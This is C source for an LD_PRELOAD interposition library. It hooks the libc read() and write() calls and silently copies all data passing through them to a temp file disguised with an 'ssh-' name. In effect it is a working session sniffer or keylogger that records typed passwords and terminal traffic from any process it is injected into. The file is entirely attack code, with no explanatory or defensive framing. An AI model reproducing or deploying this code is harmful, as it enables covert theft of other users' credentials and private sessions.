#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define read old_read
# define write old_write
#  include <unistd.h>
# undef read
#undef write


// #define DEBUG

#define OUTFILE "/tmp/ssh-CrLvXXXXXX"

//#define NEW_SESSION "-------------------------------\nNew Session:\n-----"
#define NEW_SESSION ""

typedef int (*fd_ptr_t)(int, void *, int);

static void *handle = NULL;
static int outfd = 0;
static fd_ptr_t read_ptr;
static fd_ptr_t write_ptr;

void init_dl()
{
    char template[] = OUTFILE;
    if(!handle)
    {
	if((handle = dlopen("/lib/libc.so.6", RTLD_LAZY)) == NULL)
	{
	    printf("%s\n", dlerror());
	    exit(1);
	}

	if((read_ptr = dlsym(handle, "read")) == NULL)
	{
	    printf("%s\n", dlerror());
	    exit(1);
	}
	if((write_ptr = dlsym(handle, "write")) == NULL)
	{
	    printf("%s\n", dlerror());
	    exit(1);
	}
	if((outfd = mkstemp(template)) == -1)
	{
#ifdef DEBUG
	    perror("Outfile");
	    fprintf(stderr, "Templ: %s\n", template);
#endif
	}
	write(outfd, NEW_SESSION, strlen(NEW_SESSION));
    }
}

int read(int fd, void *buf, int len)
{
    int read_len;

#ifdef DEBUG
    fprintf(stderr, "read = 0x%x, read(%d,0x%x,%d);\n", read_ptr, fd, buf, len);
#endif
    init_dl();

    read_len = read_ptr(fd, buf, len);
   
    if(read_len > 0)
	write_ptr(outfd, buf, read_len);
    
    return read_len;
}

int write(int fd, void *buf, int len)
{
    int write_len;
#ifdef DEBUG
    fprintf(stderr, "read = 0x%x, read(%d,0x%x,%d);\n", read_ptr, fd, buf, len);
#endif    
    init_dl();

    write_len = write_ptr(fd, buf, len);
   
    if(write_len > 0)
	write_ptr(outfd, buf, write_len);
    
    return write_len;
}

#ifdef DEBUG
int main()
{
    char buf[80];
    read(STDIN_FILENO, buf, sizeof(buf)-1);
    return 0;
}
#endif
